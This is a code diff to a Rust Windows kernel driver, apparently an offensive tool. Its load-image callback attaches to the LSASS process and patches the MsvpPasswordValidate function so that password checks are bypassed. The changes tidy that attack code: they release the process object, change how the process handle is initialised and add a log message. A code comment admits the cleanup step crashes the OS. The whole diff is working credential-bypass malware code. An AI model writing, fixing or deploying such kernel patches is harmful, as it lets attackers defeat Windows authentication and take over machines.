@@ -26,7 +26,7 @@ use winapi::{
 use crate::include::{
     ntddk::{
         IoFreeMdl, KeAttachProcess, KeDetachProcess, MmUnlockPages, PsLookupProcessByProcessId,
-        PsRemoveLoadImageNotifyRoutine, PsSetLoadImageNotifyRoutine,
+        PsRemoveLoadImageNotifyRoutine, PsSetLoadImageNotifyRoutine, ObDereferenceObject,
     },
     types::{LOAD_IMAGE_NOTIFY_ROUTINE, PEPROCESS},
 };
@@ -148,7 +148,7 @@ pub unsafe extern "C" fn load_image_callback(
         );
 
         log::info!("[*] Attaching to LSASS process");
-        let mut process = PEPROCESS(0);
+        let mut process = PEPROCESS::default();
         let process_ptr = core::ptr::addr_of_mut!(process);
         if PsLookupProcessByProcessId(process_id, process_ptr) != STATUS_SUCCESS {
             panic!("Failed to retrieve process from handle");
@@ -158,6 +158,8 @@ pub unsafe extern "C" fn load_image_callback(
         copy_data(&LOGIN_PATCH, msvp_password_validate);
         log::info!("[+] MsvpPasswordValidate patch applied!");
         KeDetachProcess();
+        ObDereferenceObject(process.0 as _);
+        log::info!("[*] Dettached from LSASS process");
 
         // Clean-up the load image callback
         // TODO: This crashes the OS... although it didn't before?
